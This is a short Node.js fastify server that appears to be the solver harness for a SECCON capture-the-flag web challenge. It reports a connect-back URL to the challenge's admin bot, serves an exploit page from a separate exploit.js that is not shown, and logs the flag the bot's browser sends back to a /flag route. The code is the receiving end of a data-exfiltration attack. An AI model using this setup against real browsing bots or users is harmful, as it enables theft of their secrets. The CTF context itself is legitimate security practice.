const fastify = require("fastify")();
const path = require("node:path");
const { exploit } = require("./exploit.js");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_HOST =
  process.env.SECCON_HOST ?? fail("No SECCON_HOST");
const BOT_PORT = "1337";
const CONNECTBACK_URL =
  process.env.CONNECTBACK_URL ?? fail("No CONNECTBACK_URL");
const PORT = "8080";

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const reportUrl = (url) =>
  fetch(`http://${SECCON_HOST}:${BOT_PORT}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  fastify.get("/exploit", async (req, reply) => {
    return await exploit();
  });

  fastify.get("/flag", async (req, reply) => {
    // You got a flag!
    console.log(req.query.FLAG);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    console.log("Started");

    await sleep(3 * 1000);
    await reportUrl(`${CONNECTBACK_URL}`);
    await sleep(10 * 1000);

    fail("Failed");
  });
};
start();
